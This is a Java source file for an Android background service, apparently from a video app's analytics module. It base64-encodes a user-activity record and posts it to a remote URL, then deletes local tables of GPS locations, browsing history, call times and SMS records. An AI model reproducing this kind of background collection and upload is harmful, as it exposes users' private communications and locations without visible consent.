package tv.pps.bi.proto;

import org.apache.commons.codec.binary.Base64;

import tv.pps.bi.db.DBAPPManager;
import tv.pps.bi.db.DBOperation;
import tv.pps.bi.db.config.DBConstance;
import tv.pps.bi.proto.model.UserActivity;
import tv.pps.bi.utils.LogUtils;
import tv.pps.bi.utils.ProtoNetWorkManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * 启动服务进行发送用户的行为信息
 * 
 * @author jiangqingqing
 * @time 2013/09/04
 */
public class SendUserActivityService extends Service {

	private MessageToEntityService mMsgService; // 获取用户行为信息 进封装成实体对象
	private ProtoBuffUserActivityService mProtoBuffUserActivityService;
	private UserActivity mUserActivity;
	private byte[] infoBytes; //protobuff格式化的的字节数组
	private Base64 base64;
	private Context mContext;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onCreate()
	 */
	@Override
	public void onCreate() {
		mContext=this;
		super.onCreate();
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onStartCommand(android.content.Intent, int, int)
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		mMsgService = new MessageToEntityService(mContext);
		mUserActivity = mMsgService.getMsgUserEntity();
		//mMsgService.close();//关闭数据库
		mProtoBuffUserActivityService = new ProtoBuffUserActivityService();
		infoBytes = mProtoBuffUserActivityService
				.getConstructorData(mUserActivity);
		LogUtils.v("bi", "要post的ProtoBuff数据为:" + new String(infoBytes));
		// 进行加密
		// base64 = new Base64();
		// post_str = new String(base64.encodeBase64Chunked(infoBytes));
		Thread thread = new Thread(Runnable_PostMsg);
		thread.start();
		return super.onStartCommand(intent, flags, startId);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see android.app.Service#onDestroy()
	 */
	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	/**
	 * 开启后台线程进行Post用户行为信息
	 */
	Runnable Runnable_PostMsg = new Runnable() {
		@SuppressWarnings("static-access")
		@Override
		public void run() {
			// 进行加密 上传
			base64 = new Base64();
			
			boolean result=false ;
			result= ProtoNetWorkManager
					.postUserActivityByByte(
							base64.encodeBase64Chunked(infoBytes),ProtoNetWorkManager.DELIVER_URL);
			if (result) {
				//删除发送成功的数据表中的数据
				LogUtils.i("sendData", "增量数据发送成功，准备删除数据库中的数据表");
				DBAPPManager manager=DBAPPManager.getDBManager(mContext); 	
				manager.delete();
				DBOperation operation = new DBOperation(mContext);
				operation.deleteRecordsInTable(DBConstance.TABLE_GPS);  //删除GPS信息数据
				operation.deleteRecordsInTable(DBConstance.TABLE_URL);     //删除网页浏览记录信息数据
				operation.deleteRecordsInTable(DBConstance.TABLE_BOOT_TIME); //删除系统开机时间信息数据
				operation.deleteRecordsInTable(DBConstance.TABLE_SHUT_TIME);
				operation.deleteRecordsInTable(DBConstance.TABLE_PHONE); //删除打电话时间的信息数据
				operation.deleteRecordsInTable(DBConstance.TABLE_SMS); //删除发短信信息数据
				operation.close();
				LogUtils.i("sendData", "成功删除数据库中的数据表");
				LogUtils.v("sendData", "Post请求返回结果为：成功");
			} else {
				LogUtils.v("sendData", "Post请求返回结果为：失败");
			}
		}
	};
}
